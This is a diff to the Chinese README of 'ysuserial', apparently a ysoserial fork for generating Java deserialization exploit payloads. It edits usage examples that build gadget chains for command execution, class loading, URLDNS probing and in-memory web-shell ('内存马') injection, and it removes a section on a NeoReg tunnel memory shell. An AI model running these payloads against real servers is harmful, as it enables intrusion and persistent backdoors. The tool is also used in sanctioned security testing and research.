@@ -155,10 +155,6 @@ java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 - 命令 `EX-SpringEcho`：Spring 命令执行回显
 - 命令 `EX-JbossEcho`：Jboss 命令执行回显
 
-Tomcat Listener NeoReg 流量隧道：
-
-- 命令 `EX-TLNeoRegFromThread`：通过线程类加载器获取指定上下文向系统内植入 NeoReg 流量隧道型内存马
-
 解决 Shiro Header 头部过长问题：
 
 - 命令 `EX-DefineClassFromParameter`：从 request 中获取指定参数的值进行类加载
@@ -305,7 +301,7 @@ java -jar ysuserial-<version>-su18-all.jar -g CommonsCollections1 -p 'open -a Ca
 示例：
 
 ```shell
-java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class-org.su18.Evil
+java -jar ysuserial-<version>-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class-org.su18.Evil
 ```
 
 效果图：
@@ -319,7 +315,7 @@ java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.clas
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.9-su18-all.jar -g CommonsBeanutils2 -p 'open -a Calculator.app'
+java -jar ysuserial-<version>-su18-all.jar -g CommonsBeanutils2 -p 'open -a Calculator.app'
 ```
 
 效果图：
@@ -359,7 +355,7 @@ java -jar ysuserial-0.9-su18-all.jar -g CommonsBeanutils2 -p 'open -a Calculator
 示例：`all:xxxxxx.dns.log`
 
 ```shell
-java -jar ysuserial-0.9-su18-all.jar -g URLDNS -p 'all:xxxxxx.dns.log'
+java -jar ysuserial-<version>-su18-all.jar -g URLDNS -p 'all:xxxxxx.dns.log'
 ```
 
 效果图：
@@ -511,8 +507,7 @@ java -jar ysuserial-<version>-su18-all.jar -g CommonsBeanutils1 -p 'EX-MS-TEXMSF
 
 # 提问与交流
 
-本项目全部利用链<font color="red">全部功能</font>以及<font color="red">全部利用链</font>
-都经过本人本地环境的完整测试。但考虑到实际环境复杂，在实际使用中还可能遇到各种各样的问题，欢迎大家一起测试，提出 ISSUES。
+本项目全部利用链<font color="red">全部功能</font>以及<font color="red">全部利用链</font>都经过本人本地环境的完整测试。但考虑到实际环境复杂，在实际使用中还可能遇到各种各样的问题，欢迎大家一起测试，提出 ISSUES。
 
 如果在项目使用时遇到任何问题，欢迎添加微信 K_MnO4 （高锰酸钾） ，或邮件 su18@javaweb.org 进行交流。
 
@@ -529,5 +524,5 @@ java -jar ysuserial-<version>-su18-all.jar -g CommonsBeanutils1 -p 'EX-MS-TEXMSF
 如果编译项目拷贝到其他位置在使用时报错找不到某些依赖的情况，可以使用 `-Djava.ext.dirs` 参数指定依赖目录，例如：
 
 ```shell
-java -Djava.ext.dirs=/Users/su18/JavaProjects/ysoserial/lib -jar ysuserial-<version>-su18-all.jar -g CommonsBeanutils1 -p "EX-MS-TWSMSFromThread"
+java -Djava.ext.dirs=/Users/su18/JavaProjects/ysoserial/lib -jar ysuserial-<version>-su18-all.jar -g CommonsBeanutils1 -p "EX-MS-TWSMSFromThread-cmd"
 ```
